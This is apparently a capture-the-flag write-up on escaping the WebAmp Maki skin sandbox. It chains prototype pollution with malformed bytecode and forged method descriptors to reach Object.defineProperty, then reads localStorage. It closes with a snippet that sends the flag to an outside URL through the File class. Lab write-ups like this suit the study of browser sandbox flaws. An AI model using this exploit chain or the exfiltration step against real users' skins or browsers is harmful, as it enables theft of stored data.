# Amped Up

## TLDR

Combine prototype pollution gadgets with a malformed maki bytecode file to invoke function calls on out-of-bounds functions, then use this to grab `Object.defineProperty`, eventually escalating to arbitrary property reading and writing, after which reading `localStorage.flag` is trivial.

## Solve

The idea is to use malicious Maki bytecode to escape the sandbox. We'll use some gadgets from the standard library to achieve this.

### The First Gadget

The first gadget we'll use is `System.getPrivateString`. This eventually leads to `getPrivateString` in `PrivateConfig`, which inherits `getSectionValues` from `ConfigPersistent`:

```typescript
// skin/makiClasses/ConfigPersistent.ts
getSectionValues(section: string): SectionValues {
  if (this._configTree[section] == null) {
    this._configTree[section] = {};
  }
  return this._configTree[section];
}
```

If we supply a section of `__proto__`, we can declare arbitrary values on the object prototype:

```javascript
// In maki
System.getPrivateString("__proto__", "foo", 1);

// In JavaScript
({}).foo // returns 1
```

(note that you may need to change the definition of `getPrivateString` in `std.mi` to make the type of the last argument `Any`, or you won't be able to set anything other than strings)

This gadget gives us a certain amount of freedom, but note that we won't be able to set a key more than once (due to the fact that `getPrivateString` only assigns the default if a value is not already present).

### The Second Gadget

The second gadget we'll use is the `BitList` class. We can use the `getitem` and `setitem` functions:

```typescript
// skin/makiClasses/BitList.ts
getitem(n: number): boolean {
  return this._items[n];
}
setitem(n: number, val: boolean) {
  this.setsize(n);
  this._items[n] = val;
}
```

Note the type signatures, both here in TypeScript, and those defined in `std.mi`, are suggestions. In practice, we can assign and query any type of value. We can abuse this to overwrite the prototype of `_items`, after which we can read from the object. This gives us a powerful arbitrary property reading primitive:

```maki
BitList grabber = new BitList;
grabber.setitem("__proto__", foo);
grabber.getitem("bar") // returns `foo.bar`
```

Trying to actually do this won't work though. WebAmp has a `std.json` which defines that `BitList`s `getitem` returns a boolean. Unfortunately, the Maki interpreter asserts that the return value matches, which means that we can't use this primitive for anything other than reading boolean properties on arbitrary objects. Not particularly useful.

### Go-Go Gadget Combiner!

If we want any hope of escaping out of the Maki sandbox, we need the ability to read arbitrary fields. The `BitList` primitive is best suited for that, but the interpreter asserts that the returned value is a boolean. Are we out of luck? Not quite.

We can use the prototype pollution to work around things. Calls in the Maki bytecode are represented using an offset to the method descriptor. It is this method descriptor that is used to resolve the function to call, as well as the signature of hte function. If we could modify this descriptor, we'd be able to do much more fun things.

Turns out we can! Let's see what happens in the interpreter if we corrupt our Maki bytecode by making the `call` instruction refer to a non-existent method offset:

```typescript
// maki/interpreter.ts
case 24:
case 112: {
  const methodOffset = command.arg;
  const method = this.methods[methodOffset];
  let methodName = method.name;
  const returnType = method.returnType;
  const classesOffset = method.typeOffset;
  methodName = methodName.toLowerCase();

  const guid = this.classes[classesOffset];
  const klass = this.classResolver(guid);
  if (!klass) {
    throw new Error("Need to add a missing class to runtime");
  }
```

We'll use our prototype pollution gadget to define a key `255` on the object prototype. When we corrupt our metadata to point to index 255 (and we assume this is out-of-bounds), we can control `method` to return anything that we polluted onto the object prototype!

In practice, this is a bit more convoluted than it sounds. We don't have the ability to define new classes in Maki, so we'll make `this.methods[255]` return an arbitrary object, then also prototype prototype pollute `name` to ensure that the `.name` access and subsequent `toLowerCase` call does not exit things:

```maki
// corrupt index 0xff to point to getitem with an undefined returnType
// to avoid assertions on return when we return a non-boolean value from bitlist
Config x = new Config; // needs to be any object, type doesn't really matter
System.getPrivateString("__proto__", "255", x);
System.getPrivateString("__proto__", "name", "getitem");
System.getPrivateString("__proto__", "undefined", "87c6577849fee743cc09f98556fd2a53");
```

What's up with the define of `undefined` to `"87c6577849fee743cc09f98556fd2a53"`? Well, since `typeOffset` is `undefined`, we'll result in accessing `this.classes[undefined]`. We'll spoof that to return the hash. Then, if we look at the class resolver:

```typescript
// maki/objects.ts
export function getClass(id: string): ObjectDefinition {
  return normalizedObjects[getFormattedId(id)];
}
```

`"87c6577849fee743cc09f98556fd2a53"` corresponds to the GUID of `BitList`, so this will just make sure that our spoofed method has the appropriate class (which is needed to actually resolve the JavaScript function that the Maki interpreter calls).

### Attempting to Get The Flag (and Failing)

Hm, surely now that we have an arbitrary read we can just grab the flag? After all, the only thing we need to do is get to `localStorage.flag`, which doesn't involve any function calls. Let's use some internal WebAmp properties to get access to `window`, then just read the storage:

```maki
// The actual code for this is way too long, but assume that it's just more of the
// arbitrary property reading using setitem(__proto__, x); getitem(y) to get x[y].
Object flag = getObject(anyObject, "_uiRoot._div.ownerDocument.defaultView.localStorage.flag");
```

Nope, unfortunately we run into a fun JavaScript quirk. You see, `ownerDocument` is not actually a property of `HTMLDivElement` directly. Instead, it is a property getter, whose getter implementation is a native method. When we overwrite the `__proto__` of `this._items`, our `this` is no longer a `HTMLDivElement`, but rather an array instance whose prototype is the `HTMLDivElement`. This results in an illegal call exception when the native code inevitably realizes it's attempting to read the `ownerDocument` of an `Array`.

We'll need to find a way of reading properties that does not involve prototype hackery.

### Constructing Objects

Let's hold off on that for a second, and briefly discuss how we can create objects. We'll need to write some fields later that require us to be able to create arbitrary JavaScript objects. The Maki VM doesn't give us a way to do that in the language itself, so we'll need to abuse BitList.

Creating arbitrary "objects" is not actually hard with our primitives. We can abuse `setitem` to write arbitrary properties into `this._items`, then we can use a _second_ BitList to obtain the `_items` of the first one, giving us an array instance with our additional fields grafted onto it:

```maki
BitList grabber = new BitList;

BitList ourObj = new BitList;
ourObj.setitem("foo", 1);
ourObj.setitem("bar", 2);

grabber.setitem("__proto__", ourObj);
grabber.getitem("_items") // returns an array instance that also has properties `foo` and `bar`
```

### Forging a Method Descriptor

Our next step is to combine our previous ideas into a powerful new primitive. We can use our prototype pollution to make out-of-bounds call instructions refer to anything we want. We previously just pointed it at the existing BitList implementation, but there's nothing that says we can't use the same primitive to forge an entirely new "Maki class" whose method implementations point to fun things like `Object.defineProperty`!

Why `Object.defineProperty`? Well, this gets us the ability to both read and write arbitrary fields. We can write by using `defineProperty` directly, and we can read by setting the `_items` of an `BitList` instance to whatever we want, and then using the `getitem` function. Two flies with one stone.

Let's first grab `Object.prototype`:

```maki
// The actual code for this is way too long, but assume that it's just more of the
// arbitrary property reading using setitem(__proto__, x); getitem(y) to get x[y].
Object Object_prototype = getObject(anyObject, "_uiRoot._bitmaps.constructor");
```

In order to call `defineProperty`, we'll need to forge the objects that the Maki interpreter expects to see when it indexes into `this.methods`. Let's forge some objects! In my exploit, I use some wrapper JavaScript code for making it easier to construct the necessary Maki code for writing objects, but the idea is the same:

```javascript
// build function list
let functions = w(makeObj([
    { name: "defineproperty", parameters: { length: 3 } }
]));

// build class descriptor as returned by `classResolver`
let klass = w(makeObj({
    prototype: raw(Object_prototype),
    functions: raw(functions)
}));

// build method descriptor
let methodDesc = w(makeObj({
    name: "defineProperty",
    typeOffset: "object_typeoffset",
}));
```

We can then corrupt some more fields on the Object prototype:

```maki
System.getPrivateString("__proto__", "254", methodDesc);
System.getPrivateString("__proto__", "object_typeoffset", "object_guid");
System.getPrivateString("__proto__", "object_guid", klass);
```

Ideally, we can now use a call instruction with offset `254` to call `defineProperty`!

Except, this doesn't work. The reason is clear if we look at the start of the call instruction again:

```typescript
// maki/interpreter.ts
case 24:
case 112: {
  const methodOffset = command.arg;
  const method = this.methods[methodOffset];
  let methodName = method.name;
  const returnType = method.returnType;
  const classesOffset = method.typeOffset;
  methodName = methodName.toLowerCase();

  const guid = this.classes[classesOffset];
  const klass = this.classResolver(guid);
  if (!klass) {
    throw new Error("Need to add a missing class to runtime");
  }
```

Note the call to `methodName.toLowerCase()`. We can call `Object.defineproperty`, but not `Object.defineProperty`! If only we had a `name` whose `toLowerCase` call returns an arbitrary value.

It turns out we can actually do that fairly easily. We can construct an array with a single element, then set `toLowerCase` to `Array.prototype.toString`. For an array with a single element, that will result in just returning the result of `toString` on the first element, which returns the value as is:

```maki
BitList fakeNameContainer = new BitList;
fakeNameContainer.setitem(0, "defineProperty");
fakeNameContainer.setitem("toLowerCase", fakeNameContainer.getitem("toString"));
grabber.setitem("__proto__", fakeNameContainer);
Object fakeName = grabber.getitem("_items");
```

Calling `toLowerCase` on `fakeName` will return `"defineProperty"`, exactly what we want. Applying this technique allows us to call `Object.defineProperty`, which is enough to get arbitrary property read and writes.

### Grabbing the Flag

Now that we have access to `Object.defineProperty`, we can use it to read arbitrary properties. A quick example:

```maki
BitList grabber = new BitList;

// construct a { value: cfg } to be passed to defineProperty
BitList obj13b = new BitList;
obj13b.setitem("value", cfg);
grabber.setitem("__proto__", obj13b);
Object obj13 = grabber.getitem("_items");

// use defineProperty to replace the _items of a BitList with `cfg`
// (we corrupt the call to onDownloadFinished to point to defineProperty)
BitList obj11 = new BitList;
fakeSystem.onDownloadFinished(obj11, "_items", obj13);

// we can now read arbitrary properties of cfg directly, without any proto shenanigans
Object uiRoot = obj11.getitem("_uiRoot");
```

From here on out, we can finally use the initial chain of `_uiRoot._div.ownerDocument.defaultView.localStorage.flag` to get access to the flag. The code is quite big so I've omitted it here, but you can view it in the bundled solve.

Once we have the flag, exfiltrating it is trivial. We can abuse the `File` class, whose `exists` method allows us to make an HTTP request to an arbitrary endpoint.

```maki
string flag = obj11.getitem("flag");

// exfiltrate flag
File f = new File;
f.load("https://example.com/?flag=" + obj22);
f.exists();
```

A complete example of the skin source code, as well as the compiled skin exfiltrating the flag to example.com, can be found alongside this writeup.
